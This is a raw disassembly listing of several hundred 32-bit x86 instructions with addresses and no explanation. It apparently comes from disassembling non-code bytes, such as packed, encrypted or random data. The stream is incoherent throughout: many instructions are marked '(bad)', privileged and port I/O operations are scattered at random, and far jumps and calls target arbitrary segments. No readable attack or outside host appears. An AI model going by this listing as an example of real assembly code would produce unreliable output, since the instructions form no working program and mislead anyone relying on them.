  420dd4:	inc    esi
  420dd5:	mov    bh,0xd4
  420dd7:	mov    ds:0x6e3dcb9e,eax
  420ddc:	lds    ebx,FWORD PTR [edx-0x5f5f3fc2]
  420de2:	pop    esi
  420de3:	or     al,0x3d
  420de5:	fs xchg esp,eax
  420de7:	pop    edi
  420de8:	mov    dh,0x15
  420dea:	and    eax,0xbacfc2f2
  420def:	and    al,0x16
  420df1:	and    BYTE PTR [edi-0x5f],cl
  420df4:	jle    0x420d8c
  420df6:	rol    BYTE PTR [ecx],1
  420df8:	adc    esp,DWORD PTR [edi]
  420dfa:	aam    0x46
  420dfc:	xchg   edi,eax
  420dfd:	in     eax,dx
  420dfe:	cld    
  420dff:	adc    al,0x1e
  420e01:	xchg   BYTE PTR [esi-0x4f],bl
  420e04:	jle    0x420dd6
  420e06:	jno    0x420e17
  420e08:	pop    eax
  420e09:	fsub   DWORD PTR [ebx-0x31]
  420e0c:	(bad)  
  420e0d:	push   ds
  420e0e:	mov    esp,0xf51b0bdb
  420e13:	xchg   ecx,eax
  420e14:	xchg   BYTE PTR [ecx+0x2e],bh
  420e17:	mov    DWORD PTR [edx+0x34],edx
  420e1a:	dec    edi
  420e1b:	cs jg  0x420e2f
  420e1e:	icebp  
  420e1f:	test   DWORD PTR [edi+0x21a7d8b9],ecx
  420e25:	jbe    0x420dd8
  420e27:	iret   
  420e28:	or     eax,0xdb39714f
  420e2d:	dec    eax
  420e2e:	jmp    0xf5c2423b
  420e33:	sub    DWORD PTR [edx],0xfffffffa
  420e36:	lds    edx,FWORD PTR [ecx]
  420e38:	dec    edx
  420e39:	cmovl  ecx,DWORD PTR [edi+0x52]
  420e3d:	fild   DWORD PTR [ecx+edi*2]
  420e40:	xchg   DWORD PTR [eax],ecx
  420e42:	and    eax,0x3249afde
  420e47:	sub    bh,0xf7
  420e4a:	scas   al,BYTE PTR es:[edi]
  420e4b:	push   ebx
  420e4c:	push   esi
  420e4d:	in     eax,dx
  420e4e:	ficom  DWORD PTR [ebp+0x8daf604]
  420e54:	jmp    0x587bda0c
  420e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e5a:	jno    0x420e67
  420e5c:	mov    bl,0xb4
  420e5e:	push   ds
  420e5f:	jb     0x420e0d
  420e61:	ret    0x6696
  420e64:	ja     0x420e8e
  420e66:	imul   esi,DWORD PTR [ebx-0x9d2a9f4],0x4e
  420e6d:	push   0xade9c39f
  420e72:	out    dx,eax
  420e73:	inc    edx
  420e74:	hlt    
  420e75:	pop    edx
  420e76:	js     0x420e0c
  420e78:	jle    0x420ef0
  420e7a:	int    0x68
  420e7c:	pop    edi
  420e7d:	adc    BYTE PTR [ecx-0xbd12454],cl
  420e83:	pop    ebx
  420e84:	jmp    0x1ac5:0x9474c19
  420e8b:	xchg   esp,eax
  420e8c:	lahf   
  420e8d:	or     dl,BYTE PTR [ecx]
  420e8f:	mov    al,0x59
  420e91:	test   DWORD PTR [esi],edx
  420e93:	(bad)  
  420e94:	jl     0x420ede
  420e96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e97:	mov    ebx,0x8eaf93c
  420e9c:	sub    eax,0xf8f5b63a
  420ea1:	ins    DWORD PTR es:[edi],dx
  420ea2:	cmp    al,ah
  420ea4:	pcmpgtb mm0,QWORD PTR [ebx]
  420ea7:	cmp    eax,0xd7f8f35c
  420eac:	fdivr  QWORD PTR [ebp-0x41]
  420eaf:	(bad)  
  420eb0:	mov    esi,0xd0058f36
  420eb5:	jb     0x420f18
  420eb7:	push   esi
  420eb8:	outs   dx,DWORD PTR ds:[esi]
  420eb9:	shr    DWORD PTR [esi+0x2d],cl
  420ebc:	jne    0x420e51
  420ebe:	das    
  420ebf:	inc    esi
  420ec0:	cmp    dh,BYTE PTR [eax-0x50]
  420ec3:	in     al,dx
  420ec4:	cmovl  ebx,DWORD PTR [ebx+0x554f614e]
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     cl,ch
  420ed7:	jge    0x420ec9
  420ed9:	sbb    edi,eax
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	mov    BYTE PTR [esi],al
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	cmp    eax,0x7221a23e
  420ee7:	retf   0x43cd
  420eea:	in     al,dx
  420eeb:	aam    0x80
  420eed:	push   ebx
  420eee:	inc    ebp
  420eef:	out    0x91,eax
  420ef1:	cmp    DWORD PTR ds:0x2d942b2f,ebx
  420ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ef8:	repz aas 
  420efa:	jl     0x420e87
  420efc:	gs jb  0x420efb
  420eff:	aaa    
  420f00:	into   
  420f01:	xchg   DWORD PTR [ebp-0x42aad302],esp
  420f07:	je     0x420ec8
  420f09:	or     eax,0x125a490c
  420f0e:	idiv   BYTE PTR [esi+0x3ef6386e]
  420f14:	sti    
  420f15:	js     0x420f37
  420f17:	sbb    cl,ah
  420f19:	push   ds
  420f1a:	(bad)
  420f1e:	sub    ah,BYTE PTR [esi+ecx*2]
  420f21:	mov    eax,ds:0xc8ca08f4
  420f26:	and    BYTE PTR [edx],ah
  420f28:	adc    cl,BYTE PTR [ecx]
  420f2a:	aas    
  420f2b:	push   0x19
  420f2d:	aaa    
  420f2e:	jg     0x420f00
  420f30:	imul   esp,DWORD PTR [esi+ebp*4],0x11edff9a
  420f37:	icebp  
  420f38:	xchg   ebx,eax
  420f39:	stc    
  420f3a:	aaa    
  420f3b:	xchg   BYTE PTR [edx+0x5e],cl
  420f3e:	jb     0x420f19
  420f40:	xchg   esp,eax
  420f41:	(bad)  
  420f43:	or     BYTE PTR gs:[ecx+edi*8],al
  420f47:	lods   eax,DWORD PTR ds:[esi]
  420f48:	sbb    eax,0x6f0c31e6
  420f4d:	sar    BYTE PTR [ebp+0x4],cl
  420f50:	arpl   WORD PTR [edi],cx
  420f52:	mov    ds:0x2ea53fbc,al
  420f57:	loopne 0x420f02
  420f59:	xor    al,0x8b
  420f5b:	inc    ecx
  420f5c:	ficomp WORD PTR [ecx-0x6f48103d]
  420f62:	push   edx
  420f63:	mov    edi,0x5ca7efa6
  420f68:	mov    edx,0x2ef9d186
  420f6d:	stos   BYTE PTR es:[edi],al
  420f6e:	test   al,0x45
  420f70:	int    0xc9
  420f72:	jecxz  0x420f73
  420f74:	arpl   dx,bp
  420f76:	jne    0x420fdc
  420f78:	xor    ebp,DWORD PTR gs:[eax-0x26]
  420f7c:	out    dx,al
  420f7d:	fmul   QWORD PTR [edi-0x2b90d02b]
  420f83:	jle    0x420f33
  420f85:	dec    esp
  420f86:	jle    0x420fe5
  420f88:	test   eax,0xd98e6ae8
  420f8d:	ss repz pop ds
  420f90:	div    bl
  420f92:	cld    
  420f93:	clc    
  420f94:	test   eax,0x6a61a46f
  420f99:	mov    ?,WORD PTR [esi]
  420f9b:	stos   BYTE PTR es:[edi],al
  420f9c:	das    
  420f9d:	inc    ecx
  420f9e:	xchg   edi,eax
  420f9f:	xor    esi,edx
  420fa1:	pop    ebp
  420fa2:	jle    0x420fea
  420fa4:	loopne 0x420fea
  420fa6:	retf   
  420fa7:	sahf   
  420fa8:	or     dl,0xf2
  420fab:	pop    edi
  420fac:	in     eax,0x88
  420fae:	repz push eax
  420fb0:	fs push edx
  420fb2:	push   ds
  420fb3:	adc    eax,0x67e2ab59
  420fb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fb9:	int3   
  420fba:	ds cmc 
  420fbc:	push   0x839c13a0
  420fc1:	ins    DWORD PTR es:[edi],dx
  420fc2:	out    dx,al
  420fc3:	cmp    eax,0x87de7d3e
  420fc8:	push   esp
  420fc9:	mov    ds:0xeeac29b,eax
  420fce:	dec    ebp
  420fcf:	sti    
  420fd0:	sbb    ebp,DWORD PTR [edx]
  420fd2:	fimul  WORD PTR [eax+0xfaa907e]
  420fd8:	cld    
  420fd9:	in     eax,0x30
  420fdb:	dec    ecx
  420fdc:	jo     0x421037
  420fde:	cmp    al,0xb0
  420fe0:	mov    ebp,0x48566d52
  420fe5:	mov    ebp,0xec3ed4e7
  420fea:	and    DWORD PTR [esi+eiz*8+0x7d71801e],eax
  420ff1:	mov    BYTE PTR [eax-0x81315f8],ah
  420ff7:	iret   
  420ff8:	bound  esp,QWORD PTR [edi-0x80]
  420ffb:	outs   dx,BYTE PTR ds:[esi]
  420ffc:	pop    ecx
  420ffd:	cmp    esi,DWORD PTR [ecx+0x62]
  421000:	mov    gs,WORD PTR [ecx+0x4]
  421003:	mov    bh,0x4
  421005:	test   al,0x38
  421007:	ins    DWORD PTR es:[edi],dx
  421008:	mov    eax,ds:0x3fc09c50
  42100d:	imul   edx,DWORD PTR [esi],0x63
  421010:	push   edi
  421011:	int3   
  421012:	ins    BYTE PTR es:[edi],dx
  421013:	jl     0x420f95
  421015:	mov    edi,0xd65ebfb4
  42101a:	mov    bh,BYTE PTR [edx-0x1f2d3b31]
  421020:	call   0xe8aa:0x6b1c54e9
  421027:	je     0x420fff
  421029:	into   
  42102a:	stos   BYTE PTR es:[edi],al
  42102b:	icebp  
  42102c:	imul   eax,ecx,0xfffffffb
  42102f:	inc    DWORD PTR [eax+0x23108e09]
  421035:	cwde   
  421036:	sbb    eax,0x9e5a6e29
  42103b:	into   
  42103c:	jl     0x420fd9
  42103e:	and    ecx,ebp
  421040:	push   cs
  421041:	(bad)  
  421042:	je     0x4210b8
  421044:	(bad)  
  421045:	gs sbb al,0x2f
  421048:	jg     0x42105e
  42104a:	jnp    0x421026
  42104c:	xchg   edx,eax
  42104d:	seta   BYTE PTR ds:0x6c2ae6cf
  421054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421055:	in     eax,0xae
  421057:	js     0x42106b
  421059:	pop    edx
  42105a:	jmp    0x7eae:0xcbaf03d6
  421061:	bound  ecx,QWORD PTR [ebx-0x33]
  421064:	mov    ds:0x98113ca7,eax
  421069:	sbb    DWORD PTR ds:[edi],edi
  42106c:	ds dec ebx
  42106e:	rol    DWORD PTR [edi-0x3a33930],1
  421074:	mov    ecx,0xf89b9b10
  421079:	inc    edi
  42107a:	inc    edi
  42107b:	pop    ebp
  42107c:	xchg   al,bl
  42107e:	cld    
  42107f:	pop    ebx
  421080:	adc    al,0x52
  421083:	loope  0x4210c7
  421085:	inc    esp
  421086:	mov    WORD PTR [ecx+0x36],cs
  421089:	out    0x1a,al
  42108b:	test   eax,0xde8f4d16
  421090:	sub    DWORD PTR [ecx],0xffffff89
  421093:	dec    ebx
  421094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421095:	imul   ebp,DWORD PTR [ebx],0x27f7c563
  42109b:	outs   dx,BYTE PTR ds:[esi]
  42109c:	cs pop ds
  42109e:	pop    ecx
  42109f:	adc    dl,BYTE PTR [ecx+0x7]
  4210a2:	jp     0x421036
  4210a4:	mov    esp,0x7418293c
  4210a9:	sti    
  4210aa:	jbe    0x42111c
  4210ac:	and    BYTE PTR [edx],ah
  4210ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210af:	mov    edi,0x5fcad85f
  4210b4:	les    ecx,FWORD PTR [ebp+edi*4-0x22]
  4210b8:	xchg   esp,eax
  4210b9:	add    ebx,ebp
  4210bb:	jmp    0xb09ca59
  4210c0:	test   BYTE PTR [esi+0x77b7e8b],dh
  4210c6:	fiadd  DWORD PTR [ebx-0x49c5b3c]
  4210cc:	in     al,dx
  4210cd:	dec    esi
  4210ce:	inc    ebp
  4210cf:	adc    al,0x79
  4210d1:	ins    BYTE PTR es:[edi],dx
  4210d2:	lods   al,BYTE PTR ds:[esi]
  4210d3:	adc    BYTE PTR [edx+0x28],bl
  4210d6:	stc    
  4210d7:	jmp    0x421111
  4210d9:	add    DWORD PTR [ecx+0x1120e923],0x3bf56315
  4210e3:	add    BYTE PTR [edx],0x50
  4210e6:	xchg   edi,eax
  4210e7:	mov    ds:0x4555becc,eax
  4210ec:	into   
  4210ed:	inc    eax
  4210ee:	mov    ds:0x8b72ae8f,al
  4210f3:	and    eax,0x2e551f9e
  4210f8:	xchg   bl,bh
  4210fa:	jg     0x4210e3
  4210fc:	xchg   esi,eax
  4210fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210fe:	jg     0x421154
  421100:	gs ss adc eax,0x8d3a6b68
  421107:	sbb    edi,DWORD PTR [ebp+0x2]
  42110a:	mov    dh,bl
  42110c:	lods   al,BYTE PTR ds:[esi]
  42110d:	and    eax,0x487af6f2
  421112:	xchg   esp,eax
  421113:	sbb    cl,ch
  421115:	cmp    al,cl
  421117:	mov    al,ds:0x9facd80c
  42111c:	ds mov bh,0x9f
  42111f:	dec    ebx
  421120:	cdq    
  421121:	fdiv   DWORD PTR [esi-0x4d]
  421124:	dec    ebp
  421125:	adc    eax,0x72783a16
  42112a:	add    al,0xd3
  42112c:	sub    eax,0x2cb3d216
  421131:	xchg   ebx,eax
  421132:	xchg   BYTE PTR [ebp-0x1a1beae0],al
  421138:	imul   esi,DWORD PTR [eax-0x559bd1f1],0x3cb5b680
  421142:	push   0xfffffff3
  421144:	inc    esp
  421145:	(bad)  
  421146:	jo     0x421156
  421148:	mov    ds:0xf237ab63,eax
  42114d:	jno    0x42117d
  42114f:	mov    al,0xfd
  421151:	bound  edi,QWORD PTR [edx-0x56]
  421154:	addr16 push ebx
  421156:	mov    bh,0xa2
  421158:	pop    ebp
  421159:	mov    eax,ds:0x2c489260
  42115e:	lds    eax,FWORD PTR [edx]
  421160:	cmp    DWORD PTR [eax+0x50],0xcdb00ee3
  421167:	add    ah,ch
  421169:	dec    ebp
  42116a:	xchg   DWORD PTR [edi+0x3dd9720e],ebx
  421170:	call   0x4931:0xa01e367
  421177:	fst    st(2)
  421179:	or     cl,BYTE PTR [ebx+esi*2-0x4c53a538]
  421180:	les    ebx,FWORD PTR [edx+0x74a1af67]
  421186:	inc    edi
  421187:	mov    bl,BYTE PTR [edx+0x3e]
  42118a:	outs   dx,BYTE PTR ds:[esi]
  42118b:	xchg   esi,eax
  42118c:	cmp    ebx,DWORD PTR [ecx-0xd033455]
  421192:	aaa    
  421193:	clc    
  421194:	mov    esp,0x9a9b1fb9
  421199:	pop    esi
  42119a:	mov    edi,0x553391bb
  42119f:	dec    esp
  4211a0:	pusha  
  4211a1:	in     eax,dx
  4211a2:	sbb    al,BYTE PTR [eax]
  4211a4:	lods   eax,DWORD PTR ds:[esi]
  4211a5:	repnz xor DWORD PTR [ebx+0x73a99901],ebp
  4211ac:	das    
  4211ad:	in     al,dx
  4211ae:	das    
  4211af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211b0:	daa    
  4211b1:	shl    DWORD PTR [ebx+edx*1],cl
  4211b4:	or     eax,ebx
  4211b6:	shr    DWORD PTR [ebp-0x3c],1
  4211b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ba:	pushf  
  4211bb:	ret    
  4211bc:	popa   
  4211bd:	dec    esp
  4211be:	add    ah,BYTE PTR [eax+eiz*1]
  4211c1:	iret   
  4211c2:	sub    al,0x85
  4211c4:	push   ecx
  4211c5:	idiv   DWORD PTR [eax]
  4211c7:	mov    esi,0xffa59cab
  4211cc:	fist   WORD PTR [ebx+0x63]
  4211cf:	adc    BYTE PTR [ebx],bl
  4211d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211d2:	mov    ss,WORD PTR [esi+0xec77ed6]
  4211d8:	push   eax
  4211d9:	inc    ebx
  4211da:	loopne 0x421191
  4211dc:	sbb    eax,0x77e613e1
  4211e1:	jno    0x42125f
  4211e3:	jb     0x4211b0
  4211e5:	mov    fs,WORD PTR [edi-0x2416de22]
  4211eb:	aad    0xdc
  4211ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ee:	push   edi
  4211ef:	fld    TBYTE PTR [edx+0x71]
  4211f2:	adc    al,0x48
  4211f4:	xchg   BYTE PTR [eax],dl
  4211f6:	push   es
  4211f7:	cs and eax,0xcb0a5990
  4211fd:	adc    eax,0x7963e5b7
  421202:	or     DWORD PTR [ecx+ebp*2+0x54b72c4c],edx
  421209:	sbb    al,0xdb
  42120b:	or     al,0x4f
  42120d:	jmp    0x4211e4
  42120f:	mov    bh,BYTE PTR [ebp+ecx*2+0x50]
  421213:	pusha  
  421214:	js     0x421256
  421216:	mov    al,ds:0x2ba2d6b6
  42121b:	mov    eax,ds:0x553b8537
  421220:	mov    esi,0xe3391981
  421225:	mov    ch,0xe7
  421227:	in     al,0x7d
  421229:	loop   0x42121f
  42122b:	cmp    DWORD PTR [ebx+esi*1-0x6ab481db],ecx
  421232:	sbb    al,0x8d
  421234:	lahf   
  421235:	sbb    ah,BYTE PTR [eax]
  421237:	test   BYTE PTR [edx+0x56b87f54],0x13
  42123e:	out    0xaf,eax
  421240:	int3   
  421241:	shr    DWORD PTR ds:0x89b4783a,0x7d
  421248:	icebp  
  421249:	sub    esi,ebx
  42124b:	aaa    
  42124c:	inc    esp
  42124d:	(bad)  
  42124e:	in     al,0x47
  421250:	adc    edi,DWORD PTR [edi-0x5e0663ca]
  421256:	inc    edx
  421257:	das    
  421258:	fdivr  DWORD PTR [ebx]
  42125a:	add    BYTE PTR cs:[edi+0x260f2eef],ah
  421261:	loopne 0x4212dc
  421263:	out    dx,al
  421264:	daa    
  421265:	loopne 0x4212e1
  421267:	dec    ecx
  421268:	cmc    
  421269:	lods   al,BYTE PTR ds:[esi]
  42126a:	ins    BYTE PTR es:[edi],dx
  42126b:	sahf   
  42126c:	push   esp
  42126d:	arpl   WORD PTR [edi-0x14],ax
  421270:	and    bl,dh
  421272:	out    0x2b,eax
  421274:	dec    BYTE PTR [ebp+0x62fa4f5f]
  42127a:	(bad)  
  42127b:	aas    
  42127c:	jmp    0x5fb23d1a
  421281:	shl    BYTE PTR [ebx-0x58],cl
  421284:	das    
  421285:	test   eax,0xe4e2f5bc
  42128a:	jge    0x4212b0
  42128c:	jl     0x421211
  42128e:	fldcw  WORD PTR [ecx-0x37]
  421291:	add    al,0x4e
  421293:	ror    ch,1
  421295:	pop    edx
  421296:	test   ebx,0x8ce34d41
  42129c:	jge    0x421231
  42129e:	ss (bad) 
  4212a0:	das    
  4212a1:	and    DWORD PTR [edi],0xfffffff4
  4212a4:	adc    edi,edx
  4212a6:	adc    ch,dl
  4212a8:	mul    edi
  4212aa:	in     al,dx
  4212ab:	clc    
  4212ac:	test   ah,bh
  4212ae:	and    BYTE PTR [edx],dl
  4212b0:	pop    edx
  4212b1:	sbb    BYTE PTR [esi],bl
  4212b3:	pop    esp
  4212b4:	in     al,dx
  4212b5:	adc    edi,DWORD PTR [esi+eiz*2]
  4212b8:	mov    esp,0xea8eab06
  4212bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212be:	shr    DWORD PTR [eax+0x73146382],cl
  4212c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212c5:	fidiv  WORD PTR [edx-0x2259acf8]
  4212cb:	gs retf 
  4212cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212ce:	stos   DWORD PTR es:[edi],eax
  4212cf:	cmp    dh,BYTE PTR [esi+eiz*2+0x77]
  4212d3:	lods   eax,DWORD PTR ds:[esi]
  4212d4:	add    ebp,DWORD PTR [edx+edx*8+0x65aabc5a]
  4212db:	(bad)
  4212de:	test   DWORD PTR [ecx],eax
  4212e0:	or     al,bl
  4212e2:	add    ah,BYTE PTR [ebx+0x21524db5]
  4212e8:	lahf   
  4212e9:	in     eax,dx
  4212ea:	jbe    0x4212cd
  4212ec:	jae    0x421337
  4212ee:	xor    eax,0xe9a9c62f
  4212f3:	js     0x4212fb
  4212f5:	cmp    BYTE PTR [eax+0x19],dh
  4212f8:	cmp    al,ch
  4212fa:	jp     0x4212e9
  4212fc:	jecxz  0x421286
  4212fe:	ror    BYTE PTR [eax*4-0x644bd292],0x5c
  421306:	lods   al,BYTE PTR ds:[esi]
  421307:	mov    bh,0xe6
  421309:	call   0xb83:0x30d117
  421310:	(bad)  
  421311:	sub    cl,bh
  421313:	pusha  
  421314:	pop    edi
  421315:	jge    0x4212be
  421317:	loop   0x4212cc
  421319:	sub    ebx,DWORD PTR [ebp-0x5e818e0e]
  42131f:	loop   0x4212e0
  421321:	imul   esi,DWORD PTR [esi+0x8],0xfed00ff2
  421328:	(bad)  
  421329:	jno    0x4212c1
  42132b:	rcl    BYTE PTR [ecx+ecx*1-0x2f],1
  42132f:	or     BYTE PTR ds:0x5f89649,bl
  421335:	adc    DWORD PTR [eax],ebx
  421337:	jp     0x42138d
  421339:	pop    esi
  42133a:	mov    DWORD PTR [edx+0x6a2b3c45],ecx
  421340:	pop    ecx
  421341:	mov    esi,0xd8775bb7
  421346:	test   DWORD PTR [ecx+0x5f8d682d],0x1b87d1cf
  421350:	mov    DWORD PTR [esi],edi
  421352:	xor    eax,0x1a2f8bb9
  421357:	cdq    
  421358:	and    al,0xc8
  42135a:	push   0x1723ed98
  42135f:	in     eax,dx
  421360:	and    bl,bl
  421362:	(bad)  
  421363:	sbb    BYTE PTR [ebx],bh
  421365:	jmp    0x20f36518
  42136a:	xchg   DWORD PTR [eax-0x52d2af99],ebx
  421370:	retf   0x941f
  421373:	ds xchg ecx,eax
  421375:	jg     0x4212fc
  421377:	xchg   ebx,eax
  421378:	cli    
  421379:	pop    esp
  42137a:	or     BYTE PTR [esi],ah
  42137c:	jnp    0x42136e
  42137e:	pop    ss
  42137f:	mov    al,0x9f
  421381:	inc    edi
  421382:	fstp   DWORD PTR [esi-0x1b]
  421385:	sbb    dh,al
  421387:	xor    eax,0x17b7b435
  42138c:	test   DWORD PTR [ebp+0x28bcc544],edx
  421392:	leave  
  421393:	test   BYTE PTR [ebx-0x7a],dh
  421396:	loopne 0x421325
  421398:	and    eax,0xf0621129
  42139d:	scas   al,BYTE PTR es:[edi]
  42139e:	pop    ss
  42139f:	je     0x4213b1
  4213a1:	cmp    DWORD PTR [edi+eiz*2+0x1b],esp
  4213a5:	jnp    0x421392
  4213a7:	jbe    0x4213ea
  4213a9:	aaa    
  4213aa:	xor    BYTE PTR [ecx-0x6be2200f],0xca
  4213b1:	cld    
  4213b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213b3:	jno    0x4213b6
  4213b5:	leave  
  4213b6:	dec    DWORD PTR [edi-0x6284b279]
  4213bc:	nop
  4213bd:	jns    0x4213bc
  4213bf:	pop    ecx
  4213c0:	pop    ecx
  4213c1:	inc    esi
  4213c2:	mov    ch,0x8
  4213c4:	jge    0x421426
  4213c6:	xchg   edx,eax
  4213c7:	mov    edx,ebx
  4213c9:	or     dl,0xfa
  4213cc:	ficom  DWORD PTR [esi+eiz*1]
  4213cf:	retf   0xe4d7
  4213d2:	ret    0xbb96
  4213d5:	out    dx,eax
  4213d6:	bt     DWORD PTR [edx+esi*4],ebx
  4213da:	bnd ret 
  4213dc:	add    esp,DWORD PTR [ecx-0x11]
  4213df:	adc    eax,0x9b2c12e6
  4213e4:	adc    eax,0xe76676be
  4213e9:	jo     0x4213e9
  4213eb:	les    edi,FWORD PTR [ebp+0x67]
  4213ee:	aam    0x8
  4213f0:	adc    esi,DWORD PTR [edi+0x39]
  4213f3:	fcmove st,st(4)
  4213f5:	sub    eax,DWORD PTR [eax-0x50a46835]
  4213fb:	inc    ecx
  4213fc:	jp     0x421428
  4213fe:	lock jp 0x4213b8
  421401:	in     eax,dx
  421402:	adc    eax,0x8e1b641
  421407:	repz sbb al,0xdc
  42140a:	cmp    BYTE PTR [edx],ch
  42140c:	jmp    0x10ddf570
  421411:	jecxz  0x4213d3
  421413:	inc    ecx
  421414:	cmp    dl,ch
  421416:	shl    edx,1
  421418:	popf   
  421419:	mov    eax,0x6cdf7c1f
  42141e:	aaa    
  42141f:	sbb    DWORD PTR [edx],ecx
  421421:	fisttp DWORD PTR [esp+ebp*1-0x48]
  421425:	adc    DWORD PTR [esi+0x64],edi
  421428:	xchg   esi,eax
  421429:	leave  
  42142a:	loop   0x421413
  42142c:	inc    DWORD PTR [edx-0x73]
  42142f:	inc    ecx
  421430:	fs retf 
  421432:	loop   0x42141a
  421434:	imul   ecx,edx,0x5a2147ce
  42143a:	mov    cl,0xcc
  42143c:	jge    0x4213d0
  42143e:	jae    0x42148b
  421440:	dec    ebp
  421441:	clc    
  421442:	in     eax,dx
  421443:	(bad)  [edi+ebx*1+0x1d]
  421447:	add    al,0xd0
  421449:	sbb    al,0xd
  42144b:	data16 out 0xed,al
  42144e:	and    eax,DWORD PTR [ecx-0x1d]
  421451:	ins    BYTE PTR es:[edi],dx
  421452:	jl     0x421428
  421454:	or     DWORD PTR [ecx-0x3c],edx
  421457:	push   edi
  421458:	dec    esp
  421459:	push   es
  42145a:	push   ebp
  42145b:	dec    ecx
  42145c:	sub    bl,dh
  42145e:	xor    dl,BYTE PTR [edx+0x37]
  421461:	mov    ebx,0xfeef460f
  421466:	mov    al,ds:0x16436b0e
  42146b:	in     eax,0x51
  42146d:	mov    ds:0x212e6958,al
  421472:	and    eax,0x5fea67f2
  421477:	jmp    0x421487
  421479:	inc    edi
  42147a:	sbb    eax,0x5cd2cbc9
  42147f:	jmp    0xa902:0xa60fcaa9
  421486:	imul   ebp,DWORD PTR [eax],0xffffff92
  421489:	(bad)  
  42148b:	mov    ecx,0xf314cd4e
  421490:	xchg   edi,eax
  421491:	xchg   esp,eax
  421492:	test   BYTE PTR [edi+0x1cf6d790],0xd
  421499:	dec    esp
  42149b:	xchg   ecx,eax
  42149c:	add    al,0x12
  42149e:	sub    edi,eax
  4214a0:	fimul  WORD PTR [edi-0x4e101eba]
  4214a6:	mov    ch,0x33
  4214a8:	sbb    al,0x2a
  4214aa:	mov    dh,ah
  4214ac:	jbe    0x421485
  4214ae:	cmp    eax,0x2ebeccfc
  4214b3:	mov    esp,0xd13f696b
  4214b8:	dec    edx
  4214b9:	std    
  4214ba:	adc    esp,DWORD PTR [esp+edi*1]
  4214bd:	pop    ecx
  4214be:	mov    edx,DWORD PTR [edx+ecx*2+0x61]
  4214c2:	shr    BYTE PTR [edx],1
  4214c4:	pop    esp
  4214c5:	gs jp  0x42145e
  4214c8:	retf   
  4214c9:	sub    al,BYTE PTR [ecx+0x5de6c244]
  4214cf:	inc    eax
  4214d0:	or     DWORD PTR [ecx-0x7d92c4d9],edx
  4214d6:	es sbb al,0x50
  4214d9:	add    edx,DWORD PTR [edx+0x5555a8dd]
  4214df:	jle    0x4214a4
  4214e1:	mov    ah,0x6b
  4214e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214e4:	loopne 0x4214a8
  4214e6:	or     eax,0xfffffffe
  4214e9:	adc    al,ch
  4214eb:	fst    DWORD PTR [edi+esi*8]
  4214ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214ef:	mov    ebp,0x44a188c8
  4214f4:	test   DWORD PTR [ebp+0x77b27efc],ebp
  4214fa:	mov    DWORD PTR [ebx],edx
  4214fc:	(bad)  [edx-0x6d]
  4214ff:	aam    0xdd
  421501:	adc    bh,BYTE PTR [ebx]
  421503:	pop    esp
  421504:	jecxz  0x42149d
  421506:	icebp  
  421507:	cmp    al,0xcd
  421509:	push   edi
  42150a:	cli    
  42150b:	cmp    BYTE PTR [ebp+0x2c],cl
  42150e:	adc    DWORD PTR [ecx+ebp*1],edx
  421511:	pop    esi
  421512:	adc    ax,0xae03
  421516:	icebp  
  421517:	xor    al,0xc4
  421519:	es jg  0x4214e0
  42151c:	jne    0x421544
  42151e:	and    DWORD PTR [esi],edx
  421520:	sub    eax,0x160b7bb3
  421525:	push   edi
  421526:	fnstcw WORD PTR [eax-0x4cbc839a]
  42152c:	lock pop ebx
  42152e:	shl    BYTE PTR fs:[ecx],0xc5
  421532:	or     bh,BYTE PTR [eax-0x3595cc39]
  421538:	in     al,dx
  421539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42153a:	jmp    0x4ac:0xb58d5ff8
  421541:	iret   
  421542:	ins    DWORD PTR es:[edi],dx
  421543:	mov    ebx,0x17ed1f9d
  421548:	jle    0x2770fcd2
  42154e:	fstp   TBYTE PTR [ecx-0x168f153d]
  421554:	mov    dh,0x5
  421556:	cmp    ecx,DWORD PTR [eax+0x7e328664]
  42155c:	xor    DWORD PTR [edx-0x3f9339e8],edx
  421562:	(bad)  
  421563:	mov    dl,0x91
  421565:	mov    dl,0xfd
  421567:	into   
  421568:	jl     0x42150a
  42156a:	push   edi
  42156b:	pop    edx
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x5f16e8b5
  421579:	and    BYTE PTR ds:[ecx+eax*1+0x68800],0x0
  421582:	je     0x4215d5
  421584:	sti    
  421585:	inc    esp
  421586:	inc    ebp
  421587:	mov    esi,0x4a90998
  42158c:	add    esi,ebx
  42158e:	cmp    DWORD PTR [ebx+0x1],ebx
  421591:	std    
  421592:	xor    ecx,eax
  421594:	push   ebp
  421595:	jecxz  0x42159d
  421597:	les    esi,FWORD PTR [edi+0x1def718f]
  42159d:	mov    edi,0xc6faaf7c
  4215a2:	popa   
  4215a3:	or     DWORD PTR ds:0x8fda77d5,ebx
  4215a9:	call   FWORD PTR [ebp-0x2]
  4215ac:	pushf  
  4215ad:	loope  0x42153c
  4215af:	inc    ecx
  4215b0:	sbb    al,0x3f
